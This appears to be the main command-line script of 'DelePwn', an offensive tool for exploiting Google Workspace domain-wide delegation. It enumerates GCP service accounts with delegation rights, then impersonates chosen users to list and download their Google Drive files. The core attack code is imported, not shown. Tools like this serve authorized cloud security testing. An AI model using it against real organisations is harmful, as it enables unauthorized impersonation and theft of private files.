import os 
import sys
import csv
from src.gcp_sa_enum import ServiceAccountEnumerator
from checkdelegation import CustomCredentials
from checkdelegation import check
from utils.text_color import print_color
import argparse
from drive import DriveManager

def check_gcp_bearer_access_token(testEmail, verbose):
    token = os.environ.get('GCP_BEARER_ACCESS_TOKEN')
    if token:
        try:
            credentials = CustomCredentials(token)
            enumerator = ServiceAccountEnumerator(credentials, verbose=verbose)
            if enumerator.user_email == None:
                raise Exception(print_color("[-] Error verifying token. Ensure it's refreshed.", color="red"))
            print_color(f"✓ GCP_BEARER_ACCESS_TOKEN is set with access token of {enumerator.user_email}", color="green")
            check(enumerator, testEmail, verbose)
        except Exception as e:
            print(f"An error occurred: {e}")
    else:
        print_color("GCP_BEARER_ACCESS_TOKEN environment variable is not set. This tool requires an access token for a user with the iam.ServiceAccountKeys.create permission.", color="red")
        sys.exit(1)

def handle_drive_commands(args):
    """Handle all drive-related commands"""
    drive_manager = DriveManager()
    
    # Initialize CSV if output file is specified
    if args.output:
        with open(args.output, mode='w', newline='') as csv_file:
            writer = csv.writer(csv_file)
            writer.writerow(['File', 'ID', 'Size', 'Trashed', 'Extension'])

    # Get access token for impersonation
    token = drive_manager.get_access_token(args.impersonate)

    if args.list:
        drive_manager.list_files(token, args.output, args.folder)
    elif args.download:
        if args.id:
            drive_manager.download_file(args.id, token)
        else:
            raise argparse.ArgumentError(None, "Must provide a file id with --id argument.")

def main():
    parser = argparse.ArgumentParser(description='DelePwn - Google Workspace Domain-Wide Delegation Exploitation Tool')
    subparsers = parser.add_subparsers(dest='command', help='Available commands')
    subparsers.required = True

    # Enum command parser
    parser_enum = subparsers.add_parser('enum', 
        help='Enumerate GCP service accounts with DWD privileges')
    parser_enum.add_argument('--verbose', action='store_true', 
        default=False, help='Enable verbose output')
    parser_enum.add_argument('--email', type=str, 
        help='Optional: Specify a single email to test DWD against')

    # Drive command parser
    drive_parser = subparsers.add_parser('drive', 
        help='Impersonate a user and perform actions on Google Drive')
    
    drive_group = drive_parser.add_mutually_exclusive_group(required=True)
    drive_group.add_argument('--download', action='store_true', 
        help='Download a single file from Google Drive')
    drive_group.add_argument('--list', action='store_true', 
        help='List all contents of Google Drive')

    drive_parser.add_argument('--id', type=str, 
        help='Id of the file to download')
    drive_parser.add_argument('--impersonate', type=str, required=True, 
        help='User to impersonate')
    drive_parser.add_argument('--output', type=str, 
        help='Output CSV file for Drive contents')
    drive_parser.add_argument('--folder', type=str, 
        help='List files in specific folder')

    args = parser.parse_args()

    try:
        if args.command == 'enum':
            check_gcp_bearer_access_token(args.email, args.verbose)
        elif args.command == 'drive':
            handle_drive_commands(args)
    except Exception as e:
        print_color(f"Error: {str(e)}", color="red")
        sys.exit(1)

if __name__ == "__main__":
    main()